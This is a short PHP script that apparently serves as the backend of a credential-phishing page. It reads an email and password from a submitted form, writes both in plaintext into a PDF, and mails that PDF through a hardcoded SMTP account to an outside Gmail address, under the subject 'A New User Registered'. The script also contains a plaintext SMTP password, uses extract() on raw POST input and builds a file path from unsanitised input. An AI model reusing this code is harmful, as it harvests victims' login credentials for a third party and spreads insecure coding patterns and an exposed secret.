<?php 
require('fpdf.php');
// require('FPDI-2.3.6/src/fpdi.php');
// require('FPDI-2.3.6/src/FpdfTpl.php');
// require('FPDI-2.3.6/src/FpdiTrait.php');

require('PHPMailer/src/Exception.php');
require('PHPMailer/src/PHPMailer.php');
require('PHPMailer/src/SMTP.php');

extract($_POST);
if(!$email || !$password){
	header("Location:index.html");
}

$filename = "PDF/user_".$email.".pdf";

$pdf = new FPDF();

$pdf->AddPage();
$pdf->SetFont('Arial','B',16);

$pdf->Cell(40,10, "Email ".$email );
$pdf->ln();
$pdf->Cell(40,10, "Password ".$password );

$pdf->Output($filename,"F");

$mail = new PHPMailer\PHPMailer\PHPMailer(true);


/* Open the try/catch block. */
try {

   $mail->IsSMTP(); // telling the class to use SMTP
   $mail->Host = "ssl://mail.mjm.com.ng"; 

    $doll = new PHPMailer\PHPMailer\SMTP();
    // $doll::AuthenticateO($pdf,$mail);

	$mail->Username = "demo@mjm.com.ng";
	$mail->Password = "mjmmjmltdltd";
	$mail->Port = 465;

   $mail->SMTPAuth = true;  // turn on SMTP authentication
   /* Set the mail sender. */
   $mail->setFrom('demo@mjm.com.ng', 'Php New User');

   /* Add a recipient. */
   $mail->addAddress('Kvngdebo77@gmail.com', 'reuben');

   /* Set the subject. */
   $mail->Subject = 'A New User Registered';

   $mail->addAttachment($filename);

   /* Set the mail message body. */
   $mail->Body = 'A file has been attached to the Mail';

   /* Finally send the mail. */
   $mail->send();
}
catch (Exception $e)
{
   /* PHPMailer exception. */
   echo $e->errorMessage();
}
catch (\Exception $e)
{
   /* PHP exception (note the backslash to select the global namespace Exception class). */
   echo $e->getMessage();
}
